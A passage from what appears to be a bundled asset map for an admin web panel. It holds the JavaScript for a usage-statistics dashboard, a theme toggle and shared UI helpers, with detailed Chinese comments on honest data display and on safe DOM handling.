`range`**，不自己算显示区间：滚动 30 天会横跨 31 个 UTC 日，\n  // 而服务端按整天取整之后回读的才是它真正查过的那一段。\n  const covered = el(\"p\", { class: \"muted note\" });\n  const r = data && typeof data === \"object\" ? data.range : null;\n  if (r !== null && r !== undefined && typeof r === \"object\"\n    && typeof r.from === \"number\" && typeof r.to === \"number\") {\n    covered.textContent = t(\"usage.covered\", {\n      from: fmtInstant(r.from, offsetMs()),\n      to: fmtInstant(r.to, offsetMs()),\n    });\n  } else {\n    covered.textContent = t(\"usage.covered\", { from: fmtDash(null), to: fmtDash(null) });\n  }\n  wrap.appendChild(covered);\n\n  if (range === \"30d\") wrap.appendChild(elI18n(\"p\", \"usage.range.retention\", { class: \"muted note\" }));\n  return wrap;\n}\n\n/**\n * 顶部横幅。**判据全部来自响应字段**（全局约束 10），一条都不在这里硬编码。\n *\n * ⚠️⚠️ **`note` 可能是这个面板还不认识的 code。**\n * `tests/contract/admin-usage.test.ts` 的\n * 「八种状态两两不同 —— 面板不用猜，也不该猜（但这一格证明不了没有第九种）」\n * 那一格的名字自己就把边界说清了。表外的 code 走 `usage.note.unknown`\n * **把原码照实显示出来**，绝不退回一句「加载失败」。\n */\nfunction buildNoteBanner(note, onRetry) {\n  const key = usageNoteKey(note);\n  const severity = noteSeverity(note);\n  if (severity === null) return null;\n  const cls = severity === \"error\" ? \"banner-danger\" : severity === \"warn\" ? \"banner-warn\" : \"banner-info\";\n  const banner = el(\"div\", { class: cls, role: \"status\" });\n  if (key === null) {\n    banner.appendChild(el(\"span\", null, t(\"usage.note.unknown\", { code: String(note) })));\n  } else {\n    banner.appendChild(elI18n(\"span\", key));\n  }\n  if (severity === \"error\") banner.appendChild(retryButton(onRetry));\n  return banner;\n}\n\n/**\n * 重试按钮。**`onRetry` 是必填的**：上一版无参数、一律调 `load()`，\n * 于是单日下钻那条错误横幅上的「刷新」重拉的是**汇总**而不是那一天\n * ——一颗按了不解决问题的按钮（P3d Task 5 评审 M1）。\n */\nfunction retryButton(onRetry) {\n  const btn = elI18n(\"button\", \"common.refresh\", { type: \"button\", class: \"usage-retry\" });\n  btn.addEventListener(\"click\", () => { onRetry(); });\n  return btn;\n}\n\n/**\n * 这一份响应上的两个诚实标记。两个都由后端字段驱动（全局约束 10）：\n * `≈` 看 `approximate`，「不完整」看 `malformedKind`。**一个都不许在前端硬编码。**\n *\n * ⚠️⚠️ **`incompleteOf` 判据直接走 `malformedKind()`，刻意不经 `summaryCards().complete`**\n *（P3d Task 5 定向复评 N2）：`complete` 是拿 `total` 算的\n *（`total === null ? true : …`），而 **`GET /admin/api/usage/:date` 的响应里\n * 根本没有 `total` 字段**（`src/http/admin/handlers/usage.ts` 的 `usageDateHandler`\n * 返回的是 `hours` / `byModel` / `byProtocol` / `shards` / `malformed`）\n * ⇒ 在那条端点上 `complete` **恒为 true**、标记**结构性地永不渲染**。\n * 实证（node，入参 `{ shards: 4, malformed: 2, hours: {} }`）：\n * `malformedKind` 是 `\"partial\"` 而 `complete` 是 `true`。\n * ⭐ 记一条形状：**一个「只在另一条端点上成立」的判据，在这条端点上不会报错，\n * 它只是安静地永远为假**——那种失效没有任何一格用例会红，除非有人正面钉住它。\n * 由 `tests/ui/usage.test.ts` 的\n * 「summaryCards().complete 在单日下钻那份响应上恒为 true —— 它读的是 total，\n * 而那条端点没有 total，拿它当「缺没缺块」的判据是结构性错误」正面钉着。\n *\n * ⚠️ **这两个标记只给「整块」用**：六张卡是整段区间的合计，说它不完整是准确的；\n * **表格的每一行不许各自挂标记**，理由见 `buildDayTable` 上方（定向复评 N4）。\n */\nfunction honestyMarks(resp) {\n  return {\n    approx: resp !== null && typeof resp === \"object\" && resp.approximate === true,\n    // `partial` 那一档的数字是真的、只是不全 —— 渲染成完整的就是伪造\n    // 「这份数据是全的」这个印象，而全局约束 9 禁的伪造不只是伪造 `0`。\n    // `all` 那一档**不走这里**：那时一个数字都没有（整块是 `unavailable`），\n    // 说「下面这些数字缺了几块」是在描述一堆不存在的数字（定向复评 N7）。\n    // `malformedKind` 判成 `\"partial\"` 时 `malformed` 已经被 `finite()` 验过是数字，\n    // 所以这里不再叠一层 `typeof` 兜底（收口复评 G6：那是一条走不到的支）。\n    incompleteOf: malformedKind(resp) === \"partial\" ? resp.malformed : null,\n  };\n}\n\n/**\n * 表格标题旁边那一个 `≈`。\n *\n * ⚠️ **表格里的数字与卡片上的一样是近似值，但 `≈` 只在这里出一次，不逐格出**\n *（定向复评 N5：上一版 `numberCells` 的 `marks` 形参恒为 `null` ⇒\n * 六张卡写 `≈ 100`、紧挨着的日表写 `100`，**同一个数字两种说法**，\n * 而那个不一致是沉默的——没有任何注释说过表里为什么不出）。\n * 逐格出的话 30 天档是 7 列 × 30 行 = 210 个 `≈`，那时它是装饰不是信号。\n * ⇒ **一张表出一个，挂在标题节点上**，tooltip 与卡片上那个逐字相同（同一个 `approxTitle()`）。\n *\n * ⚠️⚠️ **调用点必须先确认这一块真的出了数字**（收口复评 F1）：上一版在\n * 「这张表是空的」那条早退**之前**就无条件挂了它，实测（`days: null` /\n * `note: \"read_failed\"` / `approximate: true`）得到一张写着「这段区间的按天数据\n * 读不出来」的表、**下面挂着一个 `≈`**；而那一档下六张卡的 `≈` 反而都不出\n *（`fillCell` 的 `\"unknown\"` 支提前 return）⇒ **全页唯一一个 `≈` 就挂在\n * 那张说「读不出来」的表上**。\n * ⭐⭐ 记一条形状，它是本任务最贵的一条：**我在同一个提交里立了 N7 的裁定\n *（「下面一个数字都没有，就不许说『下面这些数字…』」），然后在另一处违反了它。**\n * ⇒ **立完一条裁定，回头 grep 一遍自己这一轮碰过的所有同型位置。**\n */\nfunction approxTitleMark(marks) {\n  if (marks === null || !marks.approx) return null;\n  return el(\"span\", { class: \"approx\", title: approxTitle() }, \" ≈\");\n}\n\n/** 六张汇总卡（设计 §10.6）。 */\nfunction buildCards(state, marks) {\n  const c = summaryCards(data);\n\n  const row = el(\"div\", { class: \"card-row\" });\n  const specs = [];\n\n  const requests = tile(\"usage.card.requests\");\n  fillCell(requests.value, cellKind(state, c.requests), fmtCount(c.requests), marks);\n  specs.push(requests.card);\n\n  const successRate = tile(\"usage.card.successRate\");\n  fillCell(successRate.value, ratioKind(state, c.requests), fmtPercent(c.success, c.requests), marks);\n  specs.push(successRate.card);\n\n  const latency = tile(\"usage.card.latency\");\n  fillCell(latency.value, cellKind(state, c.latencyMs), fmtCount(c.latencyMs), marks);\n  specs.push(latency.card);\n\n  const errorRate = tile(\"usage.card.errorRate\");\n  fillCell(errorRate.value, ratioKind(state, c.requests), fmtPercent(c.errors, c.requests), marks);\n  specs.push(errorRate.card);\n\n  // ⚠️ **协议 id → 展示名走 `GET /admin/api/models` 的 `protocols[].label`**，\n  //    id 本身来自 `capabilities.stats.tokensCoverage`（评审 I20）。\n  //    三条都不许走：本地再写一张映射、把 id 拼进一个 i18n key、直接渲染裸 id。\n  const coverage = caps && caps.stats ? caps.stats.tokensCoverage : null;\n  const labels = tokensCoverageLabels(coverage, catalog === null ? null : catalog.protocols);\n  const tokens = labels === null\n    ? tile(\"usage.card.tokens\", \"usage.card.tokensTipUnknown\")\n    : tile(\"usage.card.tokens\", \"usage.card.tokensTip\", { protocols: labels.join(\" · \") });\n  fillCell(\n    tokens.value, cellKind(state, c.tokensIn),\n    `${fmtCount(c.tokensIn)} / ${fmtCount(c.tokensOut)}`, marks,\n  );\n  specs.push(tokens.card);\n\n  const streaming = tile(\"usage.card.streaming\", \"usage.card.streamingTip\");\n  fillCell(streaming.value, cellKind(state, c.streamingRequests), fmtCount(c.streamingRequests), marks);\n  specs.push(streaming.card);\n\n  for (const card of specs) row.appendChild(card);\n  return row;\n}\n\n/** 一行「表头」。 */\nfunction headRow(keys) {\n  const tr = el(\"tr\");\n  for (const k of keys) tr.appendChild(elI18n(\"th\", k));\n  return tr;\n}\n\n/**\n * 往一行里塞那六个数字格。**日汇总表与三张分解表共用它。**\n *\n * ⚠️⚠️ **`state` 是整块的状态，不是这一行自己看出来的** —— 这是 P3d Task 5\n * 评审 C1 的根因那一句话在代码里的样子。上一版两张表各自写\n * `row.total === null ? \"unavailable\" : \"data\"`（**完全不看整块状态**），\n * 于是 `usageState` 判出来的 `unavailable` 一步都没往下传：\n * `all_malformed` 时六张卡正确地全是 EM DASH，**而紧挨着的日表把同一段区间\n * 写成「请求 0 次」**、延迟格还写着 EN DASH（= 「读成功了只是没样本」）。\n * 判据现在收在 `pure/usage.mjs` 的 `rowState()` 里，两张表都必须过它。\n *\n * ⚠️ **它不收 `marks`，这是刻意的**（定向复评 N5）：上一版留了一个第四形参\n * 而两个调用点都传 `null` ⇒ **一个恒为死的形参**，看起来像「表里也会出标记」\n * 而实际上永远不出。`≈` 改成一张表出一个、挂在标题上（见 `approxTitleMark`），\n * 「不完整」改成整块出一处（见 `buildDayTable` 上方）。**死形参一律删掉，\n * 不留着当占位**——留着的那个迟早会被人当成「已经接好了」。\n */\nfunction numberCells(tr, state, bucket) {\n  const st = rowState(state, bucket);\n  const b = bucketCells(bucket);\n  const cells = [\n    [cellKind(st, b.requests), fmtCount(b.requests)],\n    [cellKind(st, b.success), fmtCount(b.success)],\n    [cellKind(st, b.errors), fmtCount(b.errors)],\n    [cellKind(st, b.tokensIn), `${fmtCount(b.tokensIn)} / ${fmtCount(b.tokensOut)}`],\n    [cellKind(st, b.streamingRequests), fmtCount(b.streamingRequests)],\n    [cellKind(st, b.latencyMs), fmtCount(b.latencyMs)],\n  ];\n  for (const [kind, text] of cells) {\n    const td = el(\"td\", { class: \"mono\" });\n    fillCell(td, kind, text, null);\n    tr.appendChild(td);\n  }\n}\n\n/** 表格里那个「键」格（日期 / 小时 / 模型名）。 */\nfunction keyCell(text) {\n  return el(\"td\", { class: \"mono\" }, text);\n}\n\n/**\n * 日汇总表。点「下钻」展开那一天的分解。\n *\n * ⚠️⚠️ **表格的每一行不挂「不完整」标记，这一条是订正过的**（定向复评 N4）：\n * 上一版给**每一行**的日期格挂了一个，而 `malformed` 数的是**整段区间**的畸形分片\n * ⇒ 30 天档下 30 行全写「不完整」，其中绝大多数天其实是完整的\n * ——**对那些天它是一句假话**。上一版自己的注释还承认「我们并不知道具体哪一格短了」，\n * 却对每一格都下了断言。⭐ 记一条形状：**「我们不知道是哪一个」推不出\n * 「所以每一个都标上」，它只推得出「只能对整体说」。**\n * ⇒ 「缺了几块」**不在表格里逐行说**。它在哪里说，逐处列全（收口复评 G3：\n * 上一版这里写「只由整块那一处说」而**漏掉了六张卡**，同一提交的用例\n * 第 ② 句正面断言「六张卡带标记」、`fillCell()` 也确实挂）：\n * · 汇总侧 = **1 条红条**（`usage.note.partialMalformed`，`render()` 里由 `note` 驱动）\n *   **+ 六张汇总卡各一个「不完整」标记**（它们是整段区间的合计，说它不完整是准确的）；\n * · 下钻侧 = `buildDetail()` 里那一句单日口径的话。\n * **两张表格的行：一个都不挂。**\n *\n * ⚠️ `≈` 也只出一个，挂在表标题上（`approxTitleMark`，定向复评 N5）。\n */\nfunction buildDayTable(state, marks) {\n  const { wrap, body, head } = block(\"usage.table.title\");\n  const rows = dayRows(data);\n  if (rows.length === 0) {\n    // ⚠️ **「读不出来」与「这段区间里没有可以列出的日子」是两句话。**\n    //    `read_failed` 那一档 `days` 是 null ⇒ 行数也是 0，照后一句渲染\n    //    等于把一次读取失败说成「这段时间本来就没有日子」。\n    // ⚠️⚠️ **判据是白名单，收在 `pure/usage.mjs` 的 `readSucceeded()` 里**\n    //    （定向复评 N6）：上一版这里写的是黑名单\n    //    `state === \"unavailable\" ? 不可用 : 空`，方向反的；而分解表那一边是白名单。\n    //    同一件事两张表两个方向，本身就是下一次分叉的入口。\n    body.appendChild(elI18n(\n      \"p\", readSucceeded(state) ? \"usage.table.empty\" : \"usage.table.unavailable\",\n      { class: \"muted note\" },\n    ));\n    return wrap;\n  }\n  // ⚠️ **`≈` 挂在早退之后**（收口复评 F1）：上面那条早退意味着这张表一个数字都没有，\n  //    而 `≈` 是一句关于「下面那些数字」的话。挂在**标题节点**上（G2）。\n  const mark = approxTitleMark(marks);\n  if (mark !== null) head.appendChild(mark);\n  const table = el(\"table\");\n  table.appendChild(headRow([\n    \"usage.table.date\", \"usage.table.requests\", \"usage.table.success\", \"usage.table.errors\",\n    \"usage.table.tokens\", \"usage.table.streaming\", \"usage.table.latency\", \"usage.table.drill\",\n  ]));\n  for (const row of rows) {\n    const tr = el(\"tr\");\n    tr.appendChild(keyCell(row.date));\n    numberCells(tr, state, row.total);\n    const actions = el(\"td\");\n    const drill = elI18n(\"button\", \"usage.table.drill\", { type: \"button\", class: \"usage-drill\" });\n    drill.addEventListener(\"click\", () => { openDay(row.date); });\n    actions.appendChild(drill);\n    tr.appendChild(actions);\n    table.appendChild(tr);\n  }\n  body.appendChild(table);\n  return wrap;\n}\n\n/**\n * 分解表的一张（小时 / 模型 / 协议共用）。\n *\n * ⚠️ **同样不收 `marks`**：与日表同一条理由（定向复评 N2 + N4）——\n * 我们不知道是哪一个小时 / 哪一个模型短了，就只能对整块说。\n * 上一版这里有一个 `marks` 形参，而它在这条端点上**结构性地永远是 `null`**\n *（`honestyMarks` 当时经 `summaryCards().complete`，而那条端点没有 `total`），\n * 于是它既是死参、又给人一种「已经接好了」的错觉。\n */\nfunction breakdownTable(titleKey, keyLabelKey, map, numeric, state) {\n  const wrap = el(\"div\", { class: \"usage-breakdown\" });\n  wrap.appendChild(elI18n(\"h4\", titleKey));\n  const rows = breakdownRows(map, numeric);\n  if (rows.length === 0) {\n    // 同上：**这一天读不出来**与**这一天没有记录**是两句话。C1 点名的「第三屏」。\n    // 判据与日表共用同一个 `readSucceeded()`（定向复评 N6）。\n    wrap.appendChild(elI18n(\n      \"p\", readSucceeded(state) ? \"usage.detail.empty\" : \"usage.detail.unavailable\",\n      { class: \"muted note\" },\n    ));\n    return wrap;\n  }\n  const table = el(\"table\");\n  table.appendChild(headRow([\n    keyLabelKey, \"usage.table.requests\", \"usage.table.success\", \"usage.table.errors\",\n    \"usage.table.tokens\", \"usage.table.streaming\", \"usage.table.latency\",\n  ]));\n  for (const row of rows) {\n    const tr = el(\"tr\");\n    // ⚠️ **键来自客户端填的模型名，一律 textContent**（`el()` 走的就是它）。\n    tr.appendChild(keyCell(row.key));\n    numberCells(tr, state, row.total);\n    table.appendChild(tr);\n  }\n  wrap.appendChild(table);\n  return wrap;\n}\n\n/**\n * 单日下钻。\n *\n * ⚠️⚠️ **这一条端点根本不发 `all_malformed` / `partial_malformed`**\n *（`src/http/admin/handlers/usage.ts` 的 `usageDateHandler` 常态恒是\n * `no_request_detail`）⇒ 「这一天的分解缺没缺几块」**只能靠 `shards` / `malformed`\n * 两个字段**，走的是与汇总卡同一个 `malformedKind`。\n * 同一件事在两条端点上有两套判据，这是后端契约本身的形状，不是这里多写了一层。\n */\nfunction buildDetail() {\n  const wrap = el(\"div\", { class: \"card block\" });\n  const head = el(\"div\", { class: \"usage-detail-head\" });\n  head.appendChild(el(\"h3\", null, t(\"usage.detail.title\", { date: detailDate })));\n  const close = elI18n(\"button\", \"usage.detail.close\", { type: \"button\" });\n  close.addEventListener(\"click\", () => {\n    detailDate = null;\n    detailData = null;\n    detailFailed = false;\n    // 收起时同样把在飞的那份作废：不然它回来会把一个已经关掉的块又填上内容。\n    detailSeq++;\n    render();\n  });\n  head.appendChild(close);\n  wrap.appendChild(head);\n\n  // ⚠️ 这颗重试按钮重拉的是**这一天**，不是汇总（评审 M1）。\n  const retryDay = () => { openDay(detailDate); };\n\n  if (detailFailed) {\n    const banner = el(\"div\", { class: \"banner-danger\", role: \"status\" });\n    banner.appendChild(elI18n(\"span\", \"common.loadFailed\"));\n    banner.appendChild(retryButton(retryDay));\n    wrap.appendChild(banner);\n    return wrap;\n  }\n  if (detailData === null) return wrap;\n\n  const state = detailState(detailData);\n  const note = typeof detailData.note === \"string\" ? detailData.note : null;\n  const banner = buildNoteBanner(note, retryDay);\n  if (banner !== null) wrap.appendChild(banner);\n  // ⚠️ **这里刻意没有 `render()` 那一支的红色兜底横幅，理由不是「忘了对称」。**\n  //    ① 三张分解表在 `unavailable` 下已经各自说了「这一天的分解读不出来」，\n  //       兜底那句会是第四遍；\n  //    ② 更要紧的是它会**说错话**：`date_out_of_retention` 那一档\n  //       `hours` 是 null（⇒ `unavailable`）而 note 是 info 档，\n  //       套上「读取失败，显示为 —」就是把「那天的记录已经过期了」\n  //       说成「这次读挂了」——那是一次 retry 永远解决不了的事，\n  //       而横幅上还挂着一颗重试按钮。**两句都不真，比只说一句更糟。**\n  //    ⇒ 兜底放在表那一层（每张表自己说自己空的原因），不放在这一层。\n\n  // 缺了几块这件事在这条端点上只有字段说得出来（它不发畸形 code）。\n  const marks = honestyMarks(detailData);\n  // ⚠️ **同 F1：这一天读不出来时三张表一个数字都没有，那时不许挂 `≈`。**\n  //    `readSucceeded(state)` 与两张表决定「空表说哪一句」用的是同一个判据。\n  const mark = readSucceeded(state) ? approxTitleMark(marks) : null;\n  if (mark !== null) head.appendChild(mark);\n  // ⚠️⚠️ **只在 `partial` 那一档说，`all` 不说**（定向复评 N7）：\n  //    `all` 时整块是 `unavailable`、下面三张表**一个数字都没有**，\n  //    而这句话的主语是「下面这些数字」——那是在描述一堆不存在的数字。\n  //    `all` 那一档由 `note` 那条红条（「每一个都是畸形的……去查存储」）\n  //    与三张表各自的「读不出来」承担。\n  // ⚠️ **文案是单日口径的 `usage.detail.incomplete`，不是区间口径的\n  //    `usage.incompleteTip`**：后者逐字写着「这段区间里」，而这里是一天。\n  if (marks.incompleteOf !== null) {\n    const warn = el(\"p\", { class: \"muted note usage-incomplete\" });\n    warn.textContent = t(\"usage.detail.incomplete\", { malformed: fmtCount(marks.incompleteOf) });\n    wrap.appendChild(warn);\n  }\n\n  wrap.appendChild(breakdownTable(\"usage.detail.hours\", \"usage.detail.hour\", detailData.hours, true, state));\n  wrap.appendChild(breakdownTable(\"usage.detail.models\", \"usage.detail.model\", detailData.byModel, false, state));\n  wrap.appendChild(breakdownTable(\"usage.detail.protocols\", \"usage.detail.protocol\", detailData.byProtocol, false, state));\n  return wrap;\n}\n\n/**\n * 整个板块重画一遍。\n *\n * **每次都把 body 清空重建**，理由是「Tier-2 关着时页面上一个数字格都没有」\n * 这条性质要**在 DOM 里成立**，不是靠 `display: none` 藏起来：藏起来的格子\n * 仍然在无障碍树里、仍然会被复制粘贴带走，而它们显示的是一份不存在的数据。\n */\nfunction render() {\n  const host = nodes.body;\n  host.textContent = \"\";\n  const state = usageState(data);\n\n  if (state === \"off\") {\n    host.appendChild(buildOffCard());\n    return;\n  }\n\n  host.appendChild(buildRangeBar());\n\n  const note = data !== null && typeof data === \"object\" && typeof data.note === \"string\" ? data.note : null;\n  const banner = buildNoteBanner(note, load);\n  if (banner !== null) host.appendChild(banner);\n  // ⚠️⚠️ **判据是「有没有人用 error 档说过『读不出来』」，不是「有没有横幅」**\n  //（评审 M2）。上一版写的是 `banner === null`，于是 `range_clamped`（warn 档）\n  // 配上 `days: null` 时：六张卡全是 EM DASH，而页面上只有一条温和的黄条\n  // ——**没有任何一句说「读不出来」**。\n  // ⚠️ 今天后端发不出这个组合，但本文件 `buildNoteBanner` 上方刚论证过\n  //「不许假设 `note` 只可能是表内的值」；**同一条纪律在「字段组合」这一维上\n  // 一样要落实**：面板不该假设后端只会发出今天见过的那些组合。\n  if (state === \"unavailable\" && noteSeverity(note) !== \"error\") {\n    const fail = el(\"div\", { class: \"banner-danger\", role: \"status\" });\n    fail.appendChild(elI18n(\"span\", \"common.loadFailed\"));\n    fail.appendChild(retryButton(load));\n    host.appendChild(fail);\n  }\n  // 「这段时间真的是 0」要有自己的一句话。`note` 已经用 info 档说过同一件事时\n  // 不再重复（③ `no_shards`），而第 ④ 种状态的 `note` 是 `null`、没人替它说。\n  if (state === \"empty\" && (usageNoteKey(note) === null || noteSeverity(note) !== \"info\")) {\n    const empty = el(\"div\", { class: \"banner-info\", role: \"status\" });\n    empty.appendChild(elI18n(\"span\", \"usage.empty\"));\n    host.appendChild(empty);\n  }\n\n  // ⚠️ **两个诚实标记算一次，卡片与日表共用同一份**（评审 C1 / I1）：\n  //    各算各的迟早分叉，而分叉的那一边正好是「表」时，后果就是\n  //    卡片说「不完整」而紧挨着的表把同一份数字写成完整的。\n  const marks = honestyMarks(data);\n  host.appendChild(buildCards(state, marks));\n\n  // 未落盘的尾巴。判据是 `count`，**不是 `ms`**（见 `pendingTail` 的说明）。\n  const tail = pendingTail(data);\n  if (tail !== null) {\n    const p = el(\"p\", { class: tail.budgetExhausted ? \"banner-warn\" : \"muted note\" });\n    p.textContent = tail.budgetExhausted\n      ? t(\"usage.pendingExhausted\", { count: fmtCount(tail.count) })\n      : t(\"usage.pending\", { count: fmtCount(tail.count) });\n    host.appendChild(p);\n  }\n\n  host.appendChild(buildDayTable(state, marks));\n  if (detailDate !== null) host.appendChild(buildDetail());\n}\n\n/**\n * 拉汇总。**世代号在发请求之前就 +1**，回来时对不上就整份丢掉\n *（见 `seq` 上方那段：`AbortController` 一个人守不住这件事）。\n */\nasync function load() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  const mine = ++seq;\n  const signal = abort.signal;\n  const q = rangeToQuery(range, Date.now());\n  try {\n    // `q` 为 null 只在本机时钟坏掉时发生；那时不发请求，让上一次的数据留着，\n    // 而**上一次的数据本来就带着它自己的 `generatedAt`**，不会被说成是新的。\n    if (q === null) return;\n    const body = await api.get(`/usage?from=${q.from}&to=${q.to}`, { signal });\n    if (mine !== seq) return;\n    data = body;\n  } catch (e) {\n    if (mine !== seq) return;\n    if (e && e.name === \"AbortError\") return;\n    // **不伪造上一次的数据**：读失败就把 data 清空，不留着旧值以为它是新的。\n    data = null;\n  }\n  render();\n}\n\n/**\n * 拉某一天的分解。\n *\n * ⚠️ **它有自己的世代号，不共用 `seq`**：一开始写的是共用，而那会在一个很常见的\n * 操作序列上把下钻卡成空的 —— 点开某一天之后**再点一次「刷新」**，`load()` 把 `seq`\n * 顶上去，回来的那份分解就被当成过期的丢掉了，而那一天明明还开着。\n * 两件事的作废条件本来就不同：切走板块要把两者一起作废（`onHide()` 两个都 +1），\n * 但重拉汇总**不该**作废一次仍然有效的下钻。\n */\nasync function openDay(date) {\n  detailDate = date;\n  detailData = null;\n  detailFailed = false;\n  const mine = ++detailSeq;\n  render();\n  try {\n    const body = await api.get(`/usage/${encodeURIComponent(date)}`);\n    if (mine !== detailSeq) return;\n    detailData = body;\n  } catch (e) {\n    if (mine !== detailSeq) return;\n    detailFailed = true;\n  }\n  render();\n}\n\n/**\n * `capabilities` 与 `models` 各拉一次，**同一个 `Promise.all` 发**（都是零存储读）。\n * 拿不到就是拿不到：落盘间隔那句话换成不带数字的一版、Token 卡的 tooltip 换成\n * 「覆盖范围读不出来」，**不编缺省值**。\n */\nasync function loadStatic() {\n  if (caps !== null && catalog !== null) return;\n  const [c, m] = await Promise.all([\n    caps === null ? api.get(\"/capabilities\").catch(() => null) : Promise.resolve(caps),\n    catalog === null ? api.get(\"/models\").catch(() => null) : Promise.resolve(catalog),\n  ]);\n  if (c !== null) caps = c;\n  if (m !== null) catalog = m;\n}\n\nexport const usageSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"usage.title\"));\n    const refresh = elI18n(\"button\", \"common.refresh\", { type: \"button\" });\n    refresh.addEventListener(\"click\", () => { load(); });\n    section.appendChild(refresh);\n    const body = el(\"div\");\n    section.appendChild(body);\n    nodes = { body };\n  },\n\n  onShow() {\n    shown = true;\n    loadStatic().then(() => { if (shown && nodes !== null) render(); });\n    load();\n  },\n\n  onHide() {\n    // **三件事都要做**：abort 省掉真实网络往返，两个世代号保证汇总与下钻\n    // 回来的那份都被丢掉，`shown` 作废 `loadStatic()` 那条链（评审 M5）。\n    if (abort) { abort.abort(); abort = null; }\n    seq++;\n    detailSeq++;\n    shown = false;\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"578822766ba57771\"" },
  "/admin/js/theme.js": { body: "/**\n * 主题。`boot.js` 已经在 body 绘制之前把 data-theme 落到 html 上了（防闪白），\n * 这里只负责运行期的读写与广播。\n *\n * light 时**移除属性**而不是设成 \"light\"：CSS 里 :root 是亮色全量 token，\n * [data-theme=\"dark\"] 整体覆盖，多一个 light 值只会多一条永远匹配不上的规则。\n */\nimport { THEME_STORE as STORE } from \"./pure/storage-keys.mjs\";\n\nexport function getTheme() {\n  return document.documentElement.getAttribute(\"data-theme\") === \"dark\" ? \"dark\" : \"light\";\n}\n\nexport function setTheme(next) {\n  const dark = next === \"dark\";\n  if (dark) document.documentElement.setAttribute(\"data-theme\", \"dark\");\n  else document.documentElement.removeAttribute(\"data-theme\");\n  try { localStorage.setItem(STORE, dark ? \"dark\" : \"light\"); } catch (e) { /* 隐私模式 */ }\n  const meta = document.querySelector('meta[name=\"theme-color\"]');\n  if (meta) meta.setAttribute(\"content\", dark ? \"#14161a\" : \"#f7f8fa\");\n  document.dispatchEvent(new CustomEvent(\"themechange\", { detail: { theme: dark ? \"dark\" : \"light\" } }));\n}\n\nexport function toggleTheme() { setTheme(getTheme() === \"dark\" ? \"light\" : \"dark\"); }\n", type: "text/javascript; charset=utf-8", etag: "\"8c0fb5c57b565798\"" },
  "/admin/js/ui.js": { body: "/**\n * 公共 UI 原语。kiro2api 没有这一层，后果是 openModal 有 3 份、confirmModal 3 份、\n * svgIcon 3 份**不同的**实现——那是全局命名空间下没有强制约束的必然结果。\n *\n * 两条纪律贯穿本文件：\n * ① **一切来自接口的内容一律 textContent，永不 innerHTML。** 事件字段里会出现上游返回的内容。\n * ② **SVG 用 createElementNS 构造，不用 innerHTML**（CSP 的 script-src 'self' 要求零内联脚本，\n *    而 innerHTML 拼 SVG 是这条约束最容易被顺手破坏的地方）。\n */\nimport { t } from \"./i18n.js\";\n\nconst SVG_NS = \"http://www.w3.org/2000/svg\";\n\n/** 建元素。`text` 走 textContent；`attrs` 里 `class`/`data-*` 直接 setAttribute。 */\nexport function el(tag, attrs, text) {\n  const node = document.createElement(tag);\n  if (attrs) for (const [k, v] of Object.entries(attrs)) {\n    if (v === null || v === undefined || v === false) continue;\n    node.setAttribute(k, v === true ? \"\" : String(v));\n  }\n  if (text !== undefined && text !== null) node.textContent = String(text);\n  return node;\n}\n\n/** 建一个带 data-i18n 的元素：文案由 apply() 统一刷，切语言时不必板块自己管。 */\nexport function elI18n(tag, key, attrs) {\n  const node = el(tag, { ...(attrs || {}), \"data-i18n\": key });\n  node.textContent = t(key);\n  return node;\n}\n\n/** 内联 SVG 图标。`d` 是 path 的 d 属性。**零二进制资源**是硬规则（build-ui.mjs 会拦）。 */\nexport function svgIcon(d, size) {\n  const svg = document.createElementNS(SVG_NS, \"svg\");\n  svg.setAttribute(\"viewBox\", \"0 0 24 24\");\n  svg.setAttribute(\"width\", String(size || 16));\n  svg.setAttribute(\"height\", String(size || 16));\n  svg.setAttribute(\"fill\", \"none\");\n  svg.setAttribute(\"stroke\", \"currentColor\");\n  svg.setAttribute(\"stroke-width\", \"2\");\n  svg.setAttribute(\"aria-hidden\", \"true\");\n  const path = document.createElementNS(SVG_NS, \"path\");\n  path.setAttribute(\"d\", d);\n  svg.appendChild(path);\n  return svg;\n}\n\nexport function iconBtn(d, i18nTitleKey, onClick) {\n  const b = el(\"button\", { class: \"icon-btn\", type: \"button\", \"data-i18n-title\": i18nTitleKey });\n  b.setAttribute(\"title\", t(i18nTitleKey));\n  b.setAttribute(\"aria-label\", t(i18nTitleKey));\n  b.appendChild(svgIcon(d));\n  b.addEventListener(\"click\", onClick);\n  return b;\n}\n\n/**\n * toast。`kind` ∈ {\"ok\",\"warn\",\"err\"}。**文案一律 textContent**。\n *\n * `opts.sticky: true` 时**不自动消失**，改成挂一颗「×」按钮手动关闭。\n * **只给\"运维必须看见、看漏了会造成误判\"的那类信息用**——例如批量操作里有一部分\n * 被后端拒绝（P3c Task 4 追加裁定）：那类信息藏在 HTTP 200 的响应体里，4 秒一闪\n * 而过等于把一条诚实信号做成了几乎看不见的信号。**其余提示保持 4 秒自动消失**，\n * 不然每一次「已复制」都要用户自己去点掉，那是给不需要留痕的操作加了摩擦。\n * 默认（不传 `opts` 或 `sticky` 为假）与此前完全一致，所有既有调用点不受影响。\n *\n * ⚠️⚠️ **评审指出的可及性缺口，已修**：`#toast-host` 是 `<body>` 最后一个元素，\n * 一次 20 行批量删除之后表格里可能有上百颗按钮，键盘用户要把它们全部 Tab 过去\n * 才够得到那颗\"必须被看见、必须被点掉\"的关闭按钮——把最要紧的信号放在整页\n * 最后一个 Tab 停靠点，等于对键盘用户取消了 sticky 这个决定本身带来的收益。\n * 现在 sticky 出现时**关闭按钮直接拿到焦点**（不必再 Tab 过去），且它自己身上\n * 挂了 Escape 键——两条路径都能关掉它，不用二选一。\n */\nexport function toast(message, kind, opts) {\n  const host = document.getElementById(\"toast-host\");\n  if (!host) return;\n  const sticky = !!(opts && opts.sticky);\n  const node = el(\"div\", { class: `toast toast-${kind || \"ok\"}${sticky ? \" toast-sticky\" : \"\"}`, role: \"status\" });\n  node.appendChild(el(\"span\", null, message));\n  if (sticky) {\n    const close = el(\"button\", { type: \"button\", class: \"toast-close\", \"aria-label\": t(\"common.dismiss\") });\n    close.textContent = \"×\";\n    const dismiss = () => node.remove();\n    close.addEventListener(\"click\", dismiss);\n    close.addEventListener(\"keydown\", (ev) => { if (ev.key === \"Escape\") dismiss(); });\n    node.appendChild(close);\n    host.appendChild(node);\n    close.focus();\n  } else {\n    setTimeout(() => node.remove(), 4000);\n    host.appendChild(node);\n  }\n}\n\n/** 弹窗容器 `aria-labelledby` 用的 id 